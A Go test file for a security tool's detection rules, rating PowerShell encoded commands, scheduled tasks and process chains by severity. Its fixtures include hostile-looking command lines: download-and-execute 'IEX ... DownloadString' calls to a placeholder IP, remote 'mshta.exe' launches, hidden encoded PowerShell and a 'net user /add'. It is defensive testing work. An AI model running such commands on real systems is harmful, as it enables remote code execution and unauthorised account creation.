package detect

import (
	"math/rand"
	"strings"
	"testing"
	"tracefall/internal/model"
)

func TestPowerShellWeakOptionsAreNotHigh(t *testing.T) {
	for _, cmd := range []string{`powershell.exe -nop`, `powershell.exe -ExecutionPolicy Bypass`, `powershell.exe -nop -ep bypass -File C:\Tools\collect.ps1`} {
		e := model.Event{ID: "e", CaseID: "c", Host: "host01", User: "alice", EventType: model.EventProcessCreate, ProcessName: "powershell.exe", CommandLine: cmd}
		got := (powershellEncodedCommand{}).Evaluate([]model.Event{e})
		if len(got) != 1 || got[0].Severity != model.SeverityLow || got[0].Confidence != model.ConfidenceLow {
			t.Fatalf("weak options must be one low-confidence low lead: %+v", got)
		}
	}
}

func TestPowerShellInvocationContext(t *testing.T) {
	tests := []struct{ name, typ, proc, cmd, sev, conf string }{
		{"literal search", model.EventPowerShellScript, "powershell.exe", `Get-Content C:\Tools\audit.txt | Select-String -Pattern '-enc|IEX|DownloadString|FromBase64String'`, "", ""},
		{"unquoted literal search", model.EventPowerShellScript, "powershell.exe", `Get-Content C:\Tools\audit.txt | Select-String -Pattern IEX -AllMatches`, "low", "low"},
		{"web API request", model.EventPowerShellScript, "powershell.exe", `Invoke-WebRequest -Uri 'https://203.0.113.8/api' -Method POST -Body $data`, "", ""},
		{"download and pipeline invoke", model.EventPowerShellScript, "powershell.exe", `Invoke-WebRequest -Uri 'https://203.0.113.8/a' | IEX`, model.SeverityHigh, model.ConfidenceMedium},
		{"download and expression invoke", model.EventPowerShellScript, "powershell.exe", `IEX (Invoke-WebRequest 'https://203.0.113.8/a').Content`, model.SeverityHigh, model.ConfidenceMedium},
		{"comment", model.EventPowerShellScript, "powershell.exe", "# IEX DownloadString -enc AAAA\nGet-Date", "", ""},
		{"literal download expression", model.EventPowerShellScript, "powershell.exe", `Write-Output 'IEX (New-Object Net.WebClient).DownloadString("https://203.0.113.8/a")'`, "", ""},
		{"comment download expression", model.EventPowerShellScript, "powershell.exe", `# IEX (New-Object Net.WebClient).DownloadString('https://203.0.113.8/a')`, "", ""},
		{"block comment download expression", model.EventPowerShellScript, "powershell.exe", `<# IEX (New-Object Net.WebClient).DownloadString('https://203.0.113.8/a') #> Get-Date`, "", ""},
		{"data conversion", model.EventPowerShellScript, "powershell.exe", `$bytes=[Convert]::FromBase64String($value)`, "low", "low"},
		{"file arguments", model.EventProcessCreate, "powershell.exe", `powershell.exe -File C:\Tools\search.ps1 -enc IEX DownloadString`, "", ""},
		{"wrong flag", model.EventProcessCreate, "powershell.exe", `powershell.exe -encoding UTF8 -Command Get-Date`, "", ""},
		{"wrong executable", model.EventProcessCreate, "powershell.exe", `tool.exe -enc AAAA`, "low", "low"},
		{"missing identity", model.EventProcessCreate, "", `powershell.exe -enc AAAA`, "", ""},
		{"missing command", model.EventProcessCreate, "powershell.exe", ``, "", ""},
		{"short encoded e", model.EventProcessCreate, "powershell.exe", `powershell.exe -e AAAA`, model.SeverityMedium, model.ConfidenceMedium},
		{"short encoded ec", model.EventProcessCreate, "powershell.exe", `powershell.exe -ec AAAA`, model.SeverityMedium, model.ConfidenceMedium},
		{"numeric hidden encoded", model.EventProcessCreate, "powershell.exe", `"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -w 1 -encodedcommand AAAA`, model.SeverityHigh, model.ConfidenceMedium},
		{"unknown encoded", model.EventProcessCreate, "powershell.exe", `powershell.exe -nop -enc AAAA`, model.SeverityMedium, model.ConfidenceMedium},
		{"hidden encoded", model.EventProcessCreate, "powershell.exe", `powershell.exe -nop -w hidden -enc AAAA`, model.SeverityHigh, model.ConfidenceMedium},
		{"quoted command", model.EventProcessCreate, "powershell.exe", `powershell.exe -Command "IEX (New-Object Net.WebClient).DownloadString('https://203.0.113.8/a')"`, model.SeverityHigh, model.ConfidenceMedium},
		{"script execution construct", model.EventPowerShellScript, "powershell.exe", `IEX ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($value))); net user alice DummySecret42 /add`, model.SeverityHigh, model.ConfidenceMedium},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			e := model.Event{ID: "e", CaseID: "c", Host: "host01", User: "alice", EventType: tt.typ, ProcessName: tt.proc, CommandLine: tt.cmd}
			got := (powershellEncodedCommand{}).Evaluate([]model.Event{e})
			if tt.sev == "" {
				if len(got) != 0 {
					t.Fatalf("non-executing/lacking-context text produced %d findings", len(got))
				}
				return
			}
			if len(got) != 1 || got[0].Severity != tt.sev || got[0].Confidence != tt.conf {
				t.Fatalf("got %+v, want %s/%s", got, tt.sev, tt.conf)
			}
			if strings.Contains(got[0].Description, "DummySecret42") {
				t.Fatal("command credential leaked")
			}
			if !strings.Contains(got[0].Description, "does not establish") {
				t.Fatal("missing evidence limitation")
			}
		})
	}
}

func TestTaskConfigurationSelectsActionEvidence(t *testing.T) {
	tests := []struct{ name, proc, cmd, sev, conf string }{
		{"renamed routine", "rundll32.exe", `%windir%\system32\rundll32.exe aepdu.dll,AePduRunUpdate`, "", ""},
		{"routine program data", "tool.exe", `C:\ProgramData\Vendor\tool.exe /daily`, "", ""},
		{"routine script", "powershell.exe", `powershell.exe -File C:\Tools\daily.ps1`, "", ""},
		{"missing action", "", ``, "", ""},
		{"URL as data", "tool.exe", `C:\Tools\tool.exe --homepage https://203.0.113.8/`, "", ""},
		{"system directory encoded hidden", "powershell.exe", `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -enc AAAA`, model.SeverityHigh, model.ConfidenceMedium},
		{"writable encoded interpreter", "powershell.exe", `C:\Users\alice\AppData\Local\Temp\powershell.exe -enc AAAA`, model.SeverityMedium, model.ConfidenceMedium},
		{"nested encoded action", "cmd.exe", `cmd.exe /c powershell.exe -w hidden -enc AAAA`, model.SeverityHigh, model.ConfidenceMedium},
		{"unknown encoded", "powershell.exe", `powershell.exe -enc AAAA`, model.SeverityMedium, model.ConfidenceMedium},
		{"remote action", "mshta.exe", `C:\Windows\System32\mshta.exe https://203.0.113.8/a.hta`, model.SeverityHigh, model.ConfidenceMedium},
		{"hidden command data argument", "powershell.exe", `powershell.exe -w hidden -Command Read-Config -File C:\Users\alice\AppData\Local\Temp\data.json`, model.SeverityMedium, model.ConfidenceMedium},
		{"hidden script data argument", "powershell.exe", `powershell.exe -w hidden -File C:\Tools\daily.ps1 -File C:\Users\alice\AppData\Local\Temp\data.json`, model.SeverityMedium, model.ConfidenceMedium},
		{"writable script hidden", "powershell.exe", `powershell.exe -w hidden -File C:\Users\alice\AppData\Local\Temp\job.ps1`, model.SeverityHigh, model.ConfidenceMedium},
		{"writable executable", "job.exe", `C:\Users\alice\AppData\Local\Temp\job.exe`, model.SeverityMedium, model.ConfidenceLow},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			e := taskEvent("e", `\Microsoft\Windows\Maintenance\Daily`, "alice", tt.cmd, tt.proc)
			e.Host = "host01"
			got := (newScheduledTask{}).Evaluate([]model.Event{e})
			if tt.sev == "" {
				if !contextOnlyTaskFindings(got) {
					t.Fatalf("routine/unsupported action escalated beyond context: %d findings", len(got))
				}
				return
			}
			if len(got) != 1 || got[0].Severity != tt.sev || got[0].Confidence != tt.conf {
				t.Fatalf("got %+v want %s/%s", got, tt.sev, tt.conf)
			}
			for _, phrase := range []string{"configuration", "does not establish", "author-recorded"} {
				if !strings.Contains(got[0].Description, phrase) {
					t.Fatalf("missing %q in %s", phrase, got[0].Description)
				}
			}
		})
	}
}

func TestHostileInterpreterNestingRemainsLead(t *testing.T) {
	for _, cmd := range []string{`powershell.exe -w hidden -enc AAAA`, `cmd.exe /c powershell.exe -w hidden -enc AAAA`} {
		proc := "powershell.exe"
		if strings.HasPrefix(cmd, "cmd.exe") {
			proc = "cmd.exe"
		}
		e := model.Event{ID: "e", CaseID: "c", Host: "host01", User: "alice", EventType: model.EventProcessCreate, ProcessName: proc, ParentProcessName: proc, CommandLine: cmd}
		got := (suspiciousProcessChain{}).Evaluate([]model.Event{e})
		if len(got) != 1 || got[0].Severity != model.SeverityHigh {
			t.Fatal("independent encoded/hidden invocation lost")
		}
		if !strings.Contains(got[0].Description, "does not establish") {
			t.Fatal("missing chain limitation")
		}
	}
}

func TestInvocationRulesDeterministicAndFiltered(t *testing.T) {
	events := []model.Event{
		{ID: "a", CaseID: "c", EventType: model.EventProcessCreate, ProcessName: "powershell.exe", ParentProcessName: "powershell.exe", CommandLine: `powershell.exe -w hidden -enc AAAA`},
		{ID: "b", CaseID: "c", EventType: model.EventProcessCreate, ProcessName: "powershell.exe", ParentProcessName: "powershell.exe", CommandLine: `powershell.exe -w hidden -enc BBBB`},
		{ID: "c", CaseID: "c", EventType: model.EventPowerShellScript, CommandLine: `IEX ([Convert]::FromBase64String($value))`},
		taskEvent("d", "ActionReview", "alice", `mshta.exe https://203.0.113.8/a.hta`, "mshta.exe"),
		taskEvent("e", "ActionReview", "alice", `mshta.exe https://203.0.113.9/a.hta`, "mshta.exe"),
		{ID: "expression", CaseID: "c", EventType: model.EventPowerShellScript, CommandLine: `Write-Output "$(IEX $s)"`},
		{ID: "expression-host", CaseID: "c", EventType: model.EventPowerShellScript, CommandLine: `Write-Output "$(powershell.exe -w hidden -enc AAAA)"`},
		{ID: "userinfo", CaseID: "c", EventType: model.EventPowerShellScript, CommandLine: `IEX (iwr "https://alice:Dummy'Secret42@host01/a")`},
		{ID: "unrelated", CaseID: "c", EventType: model.EventLogonSuccess},
	}
	rng := rand.New(rand.NewSource(1))
	for _, r := range []Rule{powershellEncodedCommand{}, newScheduledTask{}, suspiciousProcessChain{}} {
		want := mustJSON(t, withoutCreatedAt(r.Evaluate(events)))
		if len(r.Evaluate(events)) < 2 {
			t.Fatalf("%s: vacuous fixture", r.ID())
		}
		for n := 0; n < 20; n++ {
			shuffled := append([]model.Event(nil), events...)
			rng.Shuffle(len(shuffled), func(i, j int) { shuffled[i], shuffled[j] = shuffled[j], shuffled[i] })
			filtered, err := model.SliceSource(shuffled).Load(r.(interface{ Inputs() model.EventFilter }).Inputs())
			if err != nil {
				t.Fatal(err)
			}
			if got := mustJSON(t, withoutCreatedAt(r.Evaluate(filtered))); got != want {
				t.Fatalf("%s shuffled/filtered output changed", r.ID())
			}
		}
	}
	all, err := RunFrom("c", model.SliceSource(events))
	if err != nil {
		t.Fatal(err)
	}
	for _, f := range all {
		if f.RuleID != "powershell-encoded-command" && f.RuleID != "new-scheduled-task" && f.RuleID != "suspicious-process-chain" {
			continue
		}
		want := model.StableID("finding", append([]string{f.CaseID, f.RuleID}, f.SupportingEvents...)...)
		if f.ID != want {
			t.Fatal("retained single-finding identity changed")
		}
	}
}

func TestInvocationCatalogReflectsEvidenceLevels(t *testing.T) {
	for _, id := range []string{"powershell-encoded-command", "new-scheduled-task"} {
		d, ok := DocFor(id)
		if !ok || d.BaseSeverity != "low" || d.BaseConfidence != "low" || d.MaxSeverity != "high" || d.MaxConfidence != "medium" {
			t.Fatalf("stale catalog: %+v", d)
		}
		if !strings.Contains(d.Basis, "configuration") && !strings.Contains(d.Basis, "literal") {
			t.Fatalf("missing evidence semantics: %+v", d)
		}
	}
}

func TestInterpreterNestingRequiresIndependentEvidence(t *testing.T) {
	for _, pair := range [][2]string{{"cmd.exe", "cmd.exe"}, {"powershell.exe", "powershell.exe"}, {"powershell.exe", "pwsh.exe"}} {
		e := model.Event{ID: "e", CaseID: "c", Host: "host01", User: "alice", EventType: model.EventProcessCreate, ParentProcessName: pair[0], ProcessName: pair[1], ProcessPath: `C:\Users\alice\AppData\Local\Temp\` + pair[1]}
		if got := (suspiciousProcessChain{}).Evaluate([]model.Event{e}); len(got) != 1 || got[0].Severity != "low" || got[0].Confidence != "low" {
			t.Fatalf("nesting alone must remain low/low, got %d findings", len(got))
		}
	}
	// Different child with an existing non-standard-path gate remains a review lead.
	e := model.Event{ID: "p", EventType: model.EventProcessCreate, ParentProcessName: "powershell.exe", ProcessName: "tool.exe", ProcessPath: `C:\Users\alice\AppData\Local\Temp\tool.exe`}
	if got := (suspiciousProcessChain{}).Evaluate([]model.Event{e}); len(got) != 1 {
		t.Fatal("lost existing distinct-child positive control")
	}
}
